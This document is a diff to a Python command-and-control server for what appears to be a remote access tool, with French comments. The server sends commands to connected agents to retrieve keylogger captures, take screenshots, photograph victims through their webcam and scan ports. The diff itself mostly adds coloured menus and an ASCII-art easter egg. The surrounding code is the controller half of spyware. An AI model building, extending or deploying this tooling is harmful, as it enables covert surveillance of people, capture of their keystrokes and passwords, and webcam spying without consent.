@@ -1,5 +1,6 @@
 import socket
 import threading
+import time
 
 ip_address = '0.0.0.0'
 port_number = 1234
@@ -11,19 +12,24 @@ def handle_connection(connection, address):
     """
     print(f"Connexion établie avec {address}")
 
-    help_text = """
-        Commandes disponibles:
-        - exit : Ferme la connexion avec le client.
-        - keylog : Affiche les frappes enregistrées par le keylogger.
-        - screenshot : Prend une capture d'écran de l'agent et l'enregistre sur la machine serveur.
-        - webcam : Prend une photo sur la machine de l'agent et l'enregistre sur la machine serveur.
-        - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée.
-        - help : Affiche cette aide.
-        """
+    help_text = (
+        "\033[1;34m"
+        "┌───────────────────────────────────────────────────────────┐\n"
+        "│                    Commandes disponibles                  │\n"
+        "├───────────────────────────────────────────────────────────┤\033[0m\n"
+        "│ \033[1;32mexit\033[0m          : Ferme la connexion avec le client.          │\033[0m\n"
+        "│ \033[1;32mkeylog\033[0m        : Affiche les frappes enregistrées par le keylogger. │\033[0m\n"
+        "│ \033[1;32mscreenshot\033[0m    : Prend une capture d'écran de l'agent et l'enregistre sur le serveur.   │\033[0m\n"
+        "│ \033[1;32mwebcam\033[0m        : Prend une photo avec la webcam de l'agent et l'enregistre sur le serveur..              │\033[0m\n"
+        "│ \033[1;32mscan <start> <end>\033[0m : Scanne les ports dans une plage donnée. │\033[0m\n"
+        "│ \033[1;32mhelp\033[0m          : Affiche cette aide.                          │\033[0m\n"
+        "\033[1;34m" 
+        "└───────────────────────────────────────────────────────────┘\033[0m"
+    )
 
     while True:
         try:
-            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
+            command = input("Entrer une commande à exécuter ('exit' ou 'help' pour commencer) : ")
 
             if command.lower() == 'exit':
                 connection.send(b'quit')
@@ -56,22 +62,26 @@ def handle_connection(connection, address):
                 if command.lower() == 'screenshot':
                     with open("screenshot.png", "wb") as f:
                         f.write(img_data)
-                    print("Capture d'écran reçue et sauvegardée sous 'screenshot.png'.")
+                    print("\u001B[32m✅\u001B[0m Capture d'écran reçue et sauvegardée sous 'screenshot.png'.")
                 else:
                     with open("webcam.png", "wb") as f:
                         f.write(img_data)
-                    print("Photo de la webcam reçue et sauvegardée sous 'webcam_image.png'.")
+                    print("\u001B[32m✅\u001B[0m Photo de la webcam reçue et sauvegardée sous 'webcam_image.png'.")
 
             elif command.startswith('scan'):
                 parts = command.split()
                 if len(parts) != 3:
-                    print("Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>")
+                    print("\u001B[31m❌\u001B[0m  Erreur : commande mal formée. Utilisez : scan <start_port> <end_port>")
                     continue
 
                 connection.send(command.encode())
                 print("Scan en cours...")
                 response = connection.recv(4096).decode()
-                print(f"Résultat du scan :\n{response}")
+                print(f"\u001B[34mℹ️\u001B[0m  Résultat du scan :\n{response}")
+                continue
+
+            elif command.lower() == 'dracaufeu':
+                ascii_art("dracaufeu.txt")
                 continue
 
             else:
@@ -99,6 +109,41 @@ def start_server():
         connection, address = ss.accept()
         thread = threading.Thread(target=handle_connection, args=(connection, address))
         thread.start()
+
+
+def ascii_art(filepath):
+    """
+    Lit et affiche le fichier contenant l'ASCII art (franchement j'ai merge parce que ca faisait plaisir à Lucas).
+    :param filepath: Chemin du fichier contenant l'art ASCII.
+    """
+    try:
+        with open(filepath, "r", encoding="utf-8") as file:
+            print("\n" + "=" * 80)
+            for line in file:
+                middle_index = len(line) // 2
+                left_part = (line[:middle_index]
+                             .replace('+', '\033[31m+\033[0m')
+                             .replace('-', '\033[31m-\033[0m')
+                             .replace('.', '\033[31m.\033[0m')
+                             .replace(':', '\033[31m:\033[0m')
+                             .replace('=', '\033[31m=\033[0m')
+                             .replace('*', '\033[31m*\033[0m')
+                             .replace('@', '\033[30m@\033[0m'))
+                right_part = (line[middle_index:]
+                              .replace('+', '\033[35m+\033[0m')
+                              .replace('-', '\033[35m-\033[0m')
+                              .replace('.', '\033[35m.\033[0m')
+                              .replace(':', '\033[35m:\033[0m')
+                              .replace('=', '\033[35m=\033[0m')
+                              .replace('*', '\033[35m*\033[0m')
+                              .replace('@', '\033[30m@\033[0m'))
+                print(left_part + right_part, end='', flush=True)
+                time.sleep(0.1)
+            print("\n" + "=" * 80)
+    except FileNotFoundError:
+        print(f"Erreur : Le fichier {filepath} est introuvable.")
+    except Exception as e:
+        print(f"Erreur lors de la lecture de l'art ASCII : {e}")
 
 if __name__ == "__main__":
     start_server()
